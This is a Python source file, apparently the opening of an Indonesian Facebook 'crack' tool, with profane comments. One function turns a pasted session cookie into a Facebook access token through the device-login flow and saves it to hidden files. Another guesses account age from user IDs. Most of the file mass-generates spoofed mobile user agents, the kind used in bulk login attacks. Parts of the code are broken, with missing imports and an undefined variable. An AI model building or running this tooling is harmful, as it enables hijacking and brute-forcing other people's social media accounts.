#EHEMM ADA UDIN MENGAWASI LO HEH ðŸš¬ KLO MAU JAN DI UBAHÂ² UA AJA YANG LU UBAH.#
#PERINGATAN DILARANG KERAS MENYEBARKAN SC INI NOT !!!!#
#KALO LU PUNYA ILMU SESI S7i AJARIN UDIN JAN PELIT ILMU LU MEK ANJG PARAH SI LU KONTOL#
import os,sys,requests,re
from rich.markdown import Markdown as mark
from rich.console import Console as sol
Console = sol()
ugent = []

def token1():
	try:
		print(' Untuk Bisa Dum Masukan Lagi Cookies Nya')
		your_cookies = input(' ├╴>  Masukan Cookie : ')
		with requests.Session() as r:
			try:
				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
				data = {'access_token': '867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01','scope': ''}
				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					print(" ├╴>  Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop('content-type');r.headers.pop('origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop('content-type');r.headers.pop('origin')
						r.headers.update({'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
						if 'Sukses!' in str(response6):
							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
							print(f"\n ├╴>  Token : {access_token}")
							tokenew = open(".token.txt","w").write(access_token)
							cook= open(".cookie.txt","w").write(your_cookies)
							print("\n ├╴>  Login Berhasil Jalankan Ulang Perintah Python nya");exit()
			except Exception as e:
				print(" ├╴>  Cookies Mokad Kontol")
				os.system('rm -rf .token.txt && rm -rf .cok.txt')
				print(e)
				time.sleep(3)
				back()
	except:pass

def tahun(fx):

	if len(fx)==15:

		if fx[:10] in ['1000000000']       :tahunz = '2009'

		elif fx[:9] in ['100000000']       :tahunz = '2009'

		elif fx[:8] in ['10000000']        :tahunz = '2009'

		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'

		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'

		elif fx[:6] in ['100001']          :tahunz = '2010-2011'

		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'

		elif fx[:6] in ['100004']          :tahunz = '2012-2013'

		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'

		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'

		elif fx[:6] in ['100009']          :tahunz = '2015'

		elif fx[:5] in ['10001']           :tahunz = '2015-2016'

		elif fx[:5] in ['10002']           :tahunz = '2016-2017'

		elif fx[:5] in ['10003']           :tahunz = '2018'

		elif fx[:5] in ['10004']           :tahunz = '2019'

		elif fx[:5] in ['10005']           :tahunz = '2020'

		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'

		else:tahunz=''

	elif len(fx) in [9,10]:

		tahunz = '2008-2009'

	elif len(fx)==8:

		tahunz = '2007-2008'

	elif len(fx)==7:

		tahunz = '2006-2007'

	else:tahunz=''

	return tahunz

	

import os

     

try:

    import requests

except ImportError:

    print('\n  installing requests ...\n')

    os.system('pip install requests')



try:

    import concurrent.futures

except ImportError:

    print('\n  installing futures ...\n')

    os.system('pip install futures')



try:

    import bs4

except ImportError:

    print('\n installing bs4 ...\n')

    os.system('pip install bs4')

import requests, re, os, random, sys, time, datetime, uuid, json

from concurrent.futures import ThreadPoolExecutor as DhanzPro

#from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn



from rich import print as prints

from datetime import datetime

from rich.tree import Tree



ct = datetime.now()

n = ct.month

bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']

try:

    if n < 0 or n > 12:

        exit()

    nTemp = n - 1

except ValueError:

    exit()

current = datetime.now()

ha = current.day #MEMEKBASAH BANGSAT AJARIN GW SESI KONTOL MEMEK NGEWE SESI S71 BANGSAT KONTOL CICAK#KLUARIN ILMU SESI LU BANGSAT AH###

op = bulan[nTemp] #MEMEKBASAH BANGSAT AJARIN GW SESI KONTOL MEMEK NGEWE SESI S71 BANGSAT KONTOL CICAK#TAITAI#

ta = current.year #MEMEKBASAH BANGSAT AJARIN GW SESI KONTOL MEMEK NGEWE SESI S71 BANGSAT KONTOL CICAK####AH#

#MEMEKBASAH BANGSAT AJARIN GW SESI KONTOL MEMEK NGEWE SESI S71 BANGSAT KONTOL CICAK#

#BANGSAT JAN DI GANTIÂ² MEK EMANG UDIN APAAN HARGAIN UDIN LAH#
#SETIDAKNYA JAN DI GANTI SEMUA JAN DI ILANGIN TUH NAMA UDIN JADIKAN LAH KENANGAN#
#SUSAH UPDATE SC NI TU CO KAGA TAU AJA LU MAH 1 BULAN SETENGAH GW UPDATE NGENTOD ðŸ¤§#
###----------[ WARNA PRINT RICH ]---------- ###

M2 = "[#FF0000]" # MERAH

H2 = "[#00FF00]" # HIJAU

K2 = "[#FFFF00]" # KUNING

B2 = "[#00C8FF]" # BIRU

P2 = "[#FFFFFF]" # PUTIH

#------------[ WARNA ]--------------#

P = '\x1b[1;97m'

M = '\x1b[1;91m'

H = '\x1b[1;92m'

K = '\x1b[1;93m'

B = '\x1b[1;94m'

U = '\x1b[1;95m' 

O = '\x1b[1;96m'

N = '\x1b[0m'    

Z = "\033[1;30m"

sir = '\033[41m\x1b[1;97m'

x = '\33[m' # DEFAULT

m = '\x1b[1;91m' #RED +

k = '\033[93m' # KUNING +

h = '\x1b[1;92m' # HIJAU +

hh = '\033[32m' # HIJAU -

u = '\033[95m' # UNGU

kk = '\033[33m' # KUNING -

b = '\33[1;96m' # BIRU -

p = '\x1b[0;34m' # BIRU +

xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820") #MEMEKBASAH BANGSAT AJARIN GW SESI KONTOL MEMEK NGEWE SESI S71 BANGSAT KONTOL CICAK BANGKE BANGSAT LAH#
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
ugen = []
ugen2 = []

for xd in range(10000):
	a='Mozilla/5.0 (Linux; U; Android 7.1.2;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Redmi 4A Build/N2G47H)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36 XiaoMi/Mint Browser/1.3.3'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)
	
	aa=random.choice(['Mozilla/5.0 (Linux; Android','Mozilla/5.0 (Linux; U; Android'])
	b=random.choice(['2.3.6;','4.0.4;','4.2.1;','4.2.2;','4.3;','4.4.2;','4.4.4;','5.0;','5.0.2;','5.1;','5.1.1;','6.0;','6;','6.0.1;','7.0.1;','7;','8;','8.0;','5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Redmi 4A Build/','SM-A315F Build/','M3s Build/LMY47I; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l=random.choice(['Mobile Safari/537.36','Mobile Safari/537.36 OPR/52.1.2254.54298','Mobile Safari/537.36 Instagram 40.0.0.14.95 Android (22/5.1; 320dpi; 720x1280; Meizu; M3s; M3s; mt6755; uk_UA; 102221279)'])
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen2.append(uakuh)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=random.choice(['POCOPHONE F1)','POCOPHONE F1 Build/QKQ1.190828.002; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen2.append(uakuh)
	
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen2.append(uakuh)
	
	aa=random.choice(['Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android'])
	b=random.choice(['2.3.6;','4.0.4;','4.2.1;','4.2.2;','4.3;','4.4.2;','4.4.4;','5.0;','5.0.2;','5.1;','5.1.1;','6.0;','6;','6.0.1;','7.0;','7.0.1;','7;','8;','8.0;','8.0.1;','9;','10;','11;','12;'])
	c=random.choice(['zh-CN;','en-hk;','en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr'])
	d=random.choice(['Infinix X507','Infinix F98','Infinix G636','Infinix Hot 10','Infinix X682B','Infinix X688B','Infinix X658E','Infinix PR652B','Infinix PR652C','Infinix X658E ','Infinix X659B','ar_AE; Infinix PR652B','Infinix X689D','Infinix X689C','Infinix X662','Infinix X675','Infinix X6812B','Infinix X6817'])
	dd=random.choice(['Build/MRA58K','Build/KOT49H','Build/JDQ39','Build/LMY47V','Build/QP1A.190711.020','Build/RP1A.200720.011','Build/RP1A.201005.001','Build/RP1A.200720.011','Build/SP1A.210812.016','Build/RP1A.200720.011'])
	e='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	f=random.randrange(10,100)
	g='0'
	h=random.randrange(4200,5195)
	i=random.randrange(40,150)
	j='Mobile Safari/537.36'
	uakuh=f'{aa} {b} {c} {d} {dd}) {e}{f}.{g}.{h}.{i} {j}'
	ugen2.append(uakuh)

for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
        
def Dhanz():
        rr = random.randint
        ua = (f"Dalvik/2.10 (Linux; U; Android {str(rr(5,13))}; SM-A032F Build/RP1A.201005.001) [FBAN/MessengerLite;FBAV/{str(rr(40,375))}.318.0.0.2.107;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/498648027;FBCR/AXIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A032F;FBSV/{str(rr(9,13))};FBCA/arm64-v8a:null;FBDM/"+"{density=3.0,width=2480,height=2480};]")
        ah = (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(3,14))}; RMX1941 Build/PPR1.180610.011) [FBAN/MessengerLite;FBAV/{str(rr(300,380))}.0.0.{str(rr(1,8))}.{str(rr(90,109))};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{str(rr(400000000,600000000))};FBCR/Indosat Ooredoo;FBMF/Realme;FBBD/Realme;FBDV/RMX1941;FBSV/{str(rr(6,11))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.0,width=720,height=1412};]")
        ar = (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(3,14))}; SM-G610Y Build/MMB29K) [FBAN/MessengerLite;FBAV/{str(rr(300,380))}.0.0.{str(rr(1,8))}.{str(rr(90,109))};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{str(rr(400000000,600000000))};FBCR/Indosat Ooredoo;FBMF/samsung;FBBD/samsung;FBDV/SM-G610Y/{str(rr(6,11))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.0,width=720,height=1412};]")
        au = (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(3,13))}; CPH2185 Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/{str(rr(40,375))}.322.0.0.5.89;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/510733775;FBCR/AXIS;FBMF/OPPO;FBBD/OPPO;FBDV/CPH2185;FBSV/{str(rr(9,13))};FBCA/arm64-v8a:null;FBDM/"+"{density=3.0,width=2480,height=2480};]")
        bu = (f"Davik/2.1.0 (Linux; U; Android {str(rr(5,14))}; SM-A310F Build/NRD90M) [FBAN/MessengerLite;FBAV/{str(rr(40,278))}.306.0.0.3.149;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/589022987;FBCR/Axiata;FBMF/SAMSUNG;FBBD/SAMSUNG;FBDV/SM-A310F{str(rr(2010,2050))};FBSV/{str(rr(5,14))};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=2048,width=2048};]")
        dz = (f"Davik/2.1.0 (Linux; U; Android {str(rr(3,12))}; RMX2010 Build/QKQ1.200209.002) [FBAN/MessengerLite;FBAV/{str(rr(45,457))}.322.0.0.3.87;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/648959049;FBCR/3;FBMF/realme;FBBD/realme;FBDV/RMX{str(rr(1901,2050))};FBSV/{str(rr(7,12))};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=1024,width=2048};]") 
        du = (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(3,12))}; {model} Build/RKQ1.200928.002) [FBAN/MessengerLite;FBAV/{str(rr(300,329))}.0.0.{str(rr(1,8))}.{str(rr(90,106))};FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/{str(rr(400000000,600000000))};FBCR/Indosat Ooredoo;FBMF/Xiaomi;FBBD/Redmi;FBDV/{model};FBSV/{str(rr(6,10))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.54375,width=720,height=1600};]")
        bw = (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(3,12))}; OPPO R11 Plus Build/NMF26X) [FBAN/MessengerLite;FBAV/{str(rr(300,329))}.0.0.{str(rr(1,8))}.{str(rr(90,106))};FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/{str(rr(400000000,500000000))};FBCR/AXIS;FBMF/OPPO;FBBD/OPPO;FBDV/OPPO R11 Plus;FBSV/{str(rr(6,10))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.0,width=720,height=1412};]")
        return random.choice([ua,ah,ar,au,bu,dz,du,bw])
        
def UserDhanzBase():
        rr = random.randint
        versi_android = str(random.randint(4,13))+".0.0"
        versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
        device = random.choice(["A1601 Build/LMY47I","CPH1853 Build/OPM1.171019.026","CPH2015 Build/PPR1.180610.011","Nexus 6P Build/OPM5.171019.014","CPH2083 Build/PPR1.180610.011","CPH1945 Build/QP1A.190711.020","CPH2059 Build/QKQ1.200114.002","LG-D802TR"])
        dev = device.split(" Build/")[0]
        az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
        build = f"{random.choice(az)}{random.choice(az)}{random.choice(az)}{random.randint(10, 90)}{random.choice(az)}"
        versi = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
        verchrome = random.choice(["602.1.50","602.2.14","602.3.12","602.4.6","603.1.30","603.2.4","603.3.8","601.1.46"])
        mob = random.choice(["14A456","14B100","14C92","14D27","14E304","14F89","14G60","13C75","13D15","13E233","13E238","13F69","13G34","13G36"])                              
        device_oppo = random.choice(["CPH2201", "CPH2195", "CPH2263", "CPH2293", "CPH3103", "CPH3155", "CPH2219", "CPH2127", "CPH2251", "CPH2015", "CPH1969", "CPH2213", "CPH2217", "CPH2235", "CPH2211", "CPH2125", "CPH1729", "CPH1983", "CPH1609", "CPH1701"])
        device_vivo = random.choice(["V2123A", "V2118A", "V2069A", "V2068A", "V2065A", "V2063A", "V2062A", "V2059A", "V2058A", "V2057A", "V2056A", "V2055A", "V2054A", "V2053A", "V2052A", "V2051A", "V2050A", "V2048A", "V2047A", "V2045A"])
        device_samsung = random.choice(["SM-A225F", "SM-A326B", "SM-A526B", "SM-A725F", "SM-A908B","SM-T500", "SM-T720", "SM-T860", "SM-T970", "SM-T976B","SM-F127G", "SM-F426B", "SM-F707B", "SM-F916U", "SM-F7110","SM-N960F", "SM-N986B", "SM-N990F", "SM-N975F", "SM-N986U"])
        device_xiaomi = random.choice(["Mi 11 Lite 5G  stable","Mi 10T Pro","Mi 11 Lite","MI 8 Lite","MI 5X MIUI","Mi 11i","Xiaomi 11 Lite 5G NE","Xiaomi 12 Lite","Mi 9T Pro","M2004J19PI MIUI","Xiaomi 12S Ultra","MIX 4","Mi 11i","Mi Note 10","Mi 9 SE","Mi 8 SE","Mi 10 SE","MI MAX 3","Xiaomi 12T","MIX 2S","MI 8 SE","Mi A3","Mi A4","MI 6","MI MAX 2","MI MAX 3","Xiaomi 12S Ultra ","Xiaomi 12SE Ultra ","Mi 11i","Mi 12i","Mi 10 Lite 5G","Mi 11 Lite 5G","Mi 12 Lite 5G","Mi 10 Lite 4G","Mi 10 Lite 4G"])
        device_google = random.choice(["Pixel 6a","Pixel 4","Pixel 5","Pixel 4 XL","Pixel 6","Pixel 6 Pro","Pixel 7 Pro","Pixel 4a","Pixel C","Pixel 5a","Pixel 2 XL","Pixel 2","Pixel Slate","Google Pixelbook Go","Google Pixelbook Go","Pixel XL","Pixel 3a"])
        device_realme = random.choice(["RMX3366", "RMX3391", "RMX3381", "RMX3376", "RMX3375", "RMX3371", "RMX3370", "RMX3369", "RMX3361", "RMX3360", "RMX3357", "RMX3356", "RMX3355", "RMX3352", "RMX3351", "RMX3350", "RMX3347", "RMX3346", "RMX3345", "RMX3341"])
        device_gt = random.choice(["GT-I9500","GT-I9300","GT-N7100","GT-S7580","GT-S5360","GT-P5210","GT-I9195","GT-P5100","GT-S5830","GT-I9100","GT-N8000","GT-P3100","GT-I8190","GT-S6102"])
        da1 = (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(2,13))}.{str(rr(1,3))}.0; {device_samsung} Build/{build}) [FBAN/MessengerLite;FBAV/{str(rr(50,347))}.317.0.0.1.73;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/980652756;FBCR/;FBMF/POCO;FBBD/POCO;FBDV/{versi_android};FBSV/{str(rr(2,12))}.{str(rr(1,2))}.0;FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=1600,width=720};]")
        da2 = (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(2,13))}.{str(rr(1,3))}.0; {device_xiaomi} Build/{build}) [FBAN/MessengerLite;FBAV/{str(rr(50,347))}.317.0.0.1.73;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/980652756;FBCR/;FBMF/MicroMax;FBBD/MicroMax;FBDV/{versi_android};FBSV/{str(rr(2,12))}.{str(rr(1,2))}.0;FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=1600,width=720};]")
        da4 = (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(2,13))}.{str(rr(1,3))}.0; {device_gt} Build/{build}) [FBAN/MessengerLite;FBAV/{str(rr(50,347))}.317.0.0.1.73;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/980652756;FBCR/;FBMF/Aiwa;FBBD/Aiwa;FBDV/{versi_android};FBSV/{str(rr(2,12))}.{str(rr(1,2))}.0;FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=1600,width=720};]")
        da5 = (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(2,13))}.{str(rr(1,3))}.0; {device_oppo} Build/{build}) [FBAN/MessengerLite;FBAV/{str(rr(50,347))}.317.0.0.1.73;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/980652756;FBCR/;FBMF/Minix;FBBD/Minix;FBDV/{versi_android};FBSV/{str(rr(2,12))}.{str(rr(1,2))}.0;FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=1600,width=720};]")
        da6 = (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(2,13))}.{str(rr(1,3))}.0; {device_vivo} Build/{build}) [FBAN/MessengerLite;FBAV/{str(rr(50,347))}.317.0.0.1.73;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/980652756;FBCR/;FBMF/OnePlus;FBBD/OnePlus;FBDV/{versi_android};FBSV/{str(rr(2,12))}.{str(rr(1,2))}.0;FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=1600,width=720};]")
